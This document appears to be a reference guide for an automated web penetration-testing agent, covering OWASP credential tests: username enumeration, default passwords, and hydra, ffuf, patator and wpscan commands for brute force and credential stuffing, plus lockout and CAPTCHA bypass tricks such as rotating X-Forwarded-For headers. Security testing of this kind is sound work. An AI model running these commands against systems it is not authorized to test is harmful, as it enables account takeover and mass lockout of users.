# Credential attacks — enumeration, stuffing, brute force (WSTG-IDNT-04, WSTG-ATHN-02/03/07)

## 1. Username enumeration (WSTG-IDNT-04)

Test the SAME differential across three surfaces — they rarely all leak, but one
usually does:

| Surface | Typical leak |
|---|---|
| Login | "Invalid password" vs "Unknown user"; different status/length/redirect |
| Password reset | "Email sent" vs "No account with that email" |
| Registration | "Username already taken" (almost always leaks) |

Differentials to diff, in order of reliability:
1. **Error string / body content** — exact wording differences.
2. **Status code** — 200 vs 401, 302 vs 200.
3. **Content length** — stable byte-count differences.
4. **Redirect target** — `/login?err=1` vs `/login?err=2`.
5. **Response time** — password hashing (bcrypt/argon2) only runs when the user
   exists; a consistent 50–300 ms gap over 5+ samples per candidate is a signal.
   Sample each candidate several times and compare medians, not single requests.
6. **Cookie behavior** — some apps set a tracking cookie only for valid users.

### ffuf enumeration recipes

Body POST, filter the invalid-user response:
```
ffuf -w users.txt -u https://example.com/login -X POST \
     -H "Content-Type: application/x-www-form-urlencoded" \
     -d "user=FUZZ&pass=invalidpass123" \
     -mc all -fr "Unknown user" -o enum.json -of json
```
- `-mc all` match every status, then filter: `-fr <regex>` body regex, `-fs <size>`
  length, `-fc <code>` status, `-fw <words>`, `-fl <lines>`.
- Calibrate first: send 3 known-bad usernames, note what is constant, filter on that.
- JSON body: `-d '{"user":"FUZZ","pass":"x"}' -H "Content-Type: application/json"`.
- Timing: add `-od outdir` to save raw responses, or use `patator` which prints
  per-request time natively.

Reset endpoint:
```
ffuf -w emails.txt -u https://example.com/forgot -X POST \
     -d "email=FUZZ" -mc all -fr "If an account exists" -o reset_enum.json -of json
```

Parse `ffuf.json`: results live in `.results[]`, each with `.input.FUZZ`, `.status`,
`.length`, `.duration`. Everything that survived your filters is a candidate — emit
the candidate list as a work-units array (`hints.valid_users`) per `references/rupu.md`.

## 2. Default and weak credentials (WSTG-ATHN-02)

Before any brute force, try:
- admin/admin, admin/password, admin/<blank>, root/root, test/test,
  administrator/administrator, user/user, guest/guest.
- Product defaults: tomcat/s3cret (manager), weblogic/welcome1, admin/changeme
  (many appliances), cisco/cisco, admin/atlantis. SecLists:
  `Passwords/Default-Credentials/` has per-product lists.
- Seasonal/company patterns for sprays: `Winter2025!`, `Company123!`, `Password1!`.

## 3. hydra

General form:
```
hydra [-l user | -L users.txt] [-p pass | -P pass.txt] [-C combos.txt] \
      [-s port] [-t tasks] [-o out] [-I] [-f] [-V] <host> <module> "<options>"
```

Key flags:
- `-L/-l` user list / single user; `-P/-p` password list / single password.
- `-C file` colon-separated `user:pass` combo list — **this is credential stuffing**
  (breached pairs, not a cartesian product).
- `-t 16` parallel tasks (default 16; drop to 4 if the app queues or locks).
- `-f` stop after first valid pair per host; `-F` across all hosts.
- `-o hydra.out` results file; `-b json` for JSON output format.
- `-I` skip the restore-file prompt (needed for automation); `-R` resume.
- `-V` show every attempt; `-e nsr` also try empty pass, pass=user, reversed user.
- `-u` loop users first (spray pattern: each password across all users — slower to
  trip per-account lockout).
- `-w 5` wait time, `-c 10` connects-per-second ceiling when the app is fragile.

### https-post-form / http-post-form module

```
hydra -L users.txt -P passwords.txt example.com https-post-form \
  "/login:user=^USER^&pass=^PASS^:F=Invalid username" -t 16 -I -o hydra.out
```

The module string is `path:body:condition[:extras]`:
- `^USER^` / `^PASS^` substitution markers.
- Condition: `F=<string>` marks FAILURE (string present => failed) or `S=<string>`
  marks SUCCESS (e.g. `S=302` or `S=Location: /dashboard`). Prefer `S=` when the
  failure message varies.
- Extras, colon-separated: `H=Cookie: level=1; PHPSESSID=abc` custom header,
  `C=/precheck` a URL to GET first for cookies/CSRF.
- CSRF-protected forms: hydra can't fetch a fresh token per attempt reliably — use
  ffuf with a pre-fetch wrapper, patator, or a short mitmproxy/python loop instead.

Other useful modules: `http-get` (Basic auth), `http-post-form`, `ssh`, `ftp`,
`mysql`, `rdp`, `smtp`, `imap`. `hydra -U <module>` prints module help.

Reading output: success lines look like
`[443][http-post-form] host: example.com   login: admin   password: Winter2025!`.
Parse `hydra.out`, then record each pair via `findings.report`
(WSTG-ATHN-02, CWE-521, severity high; evidence = a manual re-login
request/response proving the pair) and emit a work unit carrying
`hints.credentials` for the authorization track.

## 4. ffuf for brute force

Single user, password fuzz:
```
ffuf -w passwords.txt -u https://example.com/login -X POST \
     -d "user=admin&pass=FUZZ" -H "Content-Type: application/x-www-form-urlencoded" \
     -fc 401 -o brute.json -of json
```

Clusterbomb (full user × pass cartesian):
```
ffuf -w users.txt:USERW -w passwords.txt:PASSW -u https://example.com/login \
     -X POST -d "user=USERW&pass=PASSW" -mode clusterbomb \
     -mc all -fr "Invalid" -o cb.json -of json
```

Pitchfork (paired lists — credential stuffing with ffuf):
```
ffuf -w users.txt:USERW -w passwords.txt:PASSW -mode pitchfork ...
```

Throttle/stealth: `-rate 10` req/s, `-p 0.5-1.5` random delay, `-t 5` threads,
`-H "X-Forwarded-For: 192.0.2.FUZZ"` style header games belong in the lockout tests
below. `-timeout 10`, `-r` follow redirects (careful: can mask the success signal).

## 5. Alternatives

- **medusa**: `medusa -h example.com -U users.txt -P pass.txt -M http -m DIR:/login -T 10`
  — stable, module per protocol (`medusa -d` lists modules).
- **patator**: most flexible failure conditions —
  ```
  patator http_fuzz url=https://example.com/login method=POST \
    body='user=FILE0&pass=FILE1' 0=users.txt 1=passwords.txt \
    -x ignore:fgrep='Invalid username' -x ignore:code=401 \
    --rate-limit=0.2 -l patator_logs
  ```
  Shows code/size/time per attempt — ideal for timing-based enumeration too.
- **wpscan** (WordPress): enumeration `wpscan --url https://example.com -e u1-100`;
  brute force `wpscan --url https://example.com -U users.txt -P passwords.txt
  --password-attack xmlrpc` (xmlrpc multicall is far faster than wp-login when
  enabled; fall back `--password-attack wp-login`). `-o out.json -f json` for parsing.

## 6. Lockout, rate limiting, CAPTCHA (WSTG-ATHN-03)

Measure first:
1. On a throwaway/own account, send sequential failures and record at which count
   behavior changes (423/429, "account locked", CAPTCHA appears, constant-failure
   even for the right password).
2. Determine the scope: **per-account** (right design), **per-IP** (bypass by
   rotating source), or **per-session** (bypass by dropping cookies).
3. Determine reset: time-based (how long?), admin unlock, or self-reset via email.

Bypass tests (each one that works is evidence for the finding):
- **Header rotation**: `X-Forwarded-For: 203.0.113.<n>` incrementing per request;
  also `X-Real-IP`, `X-Originating-IP`, `Client-IP`, `True-Client-IP`,
  `X-Forwarded-Host`. ffuf: second wordlist of IPs in pitchfork mode on the header.
- **Username variants**: `Admin`, `admin `, `admin%00`, `ADMIN`, `admin@example.com`
  vs `admin` — if the counter keys on the raw string but auth normalizes, lockout
  is bypassed.
- **Alternate endpoints**: mobile API (`/api/v1/login`), legacy (`/login.php` vs
  `/auth`), SSO backdoor, XML-RPC, GraphQL mutation — counters are often per-endpoint.
- **Content-type switch**: same endpoint, `application/json` vs form-encoded body.
- **CAPTCHA**: remove the captcha parameter entirely; send it empty; replay one
  solved value repeatedly; check whether the API variant of the endpoint has no
  captcha at all.
- **Response-manipulation lockout check**: some apps lock client-side only.

Findings: no lockout after ~20 failures, or any working bypass → WSTG-ATHN-03,
CWE-307, medium (high if combined with enumeration + weak password policy).
Evidence = the attempt series (counts, timestamps) + the bypass exchange.

Lockout as a weapon caveat for the report: per-account lockout + enumeration =
mass-DoS of users; note it as impact, it strengthens the enumeration finding.

## 7. Handoff

Every run in this file ends rupu-shaped (see `references/rupu.md`):
- enumeration results → work-units array (`hints.valid_users`) via the `work-units` skill;
- cracked pairs → `findings.report` + a work unit with `hints.credentials` for the
  authorization/IDOR track;
- the login route → `assets.mark` `web:route`, depth `tested` (brute attempted) or
  `exploited` (pair recovered).
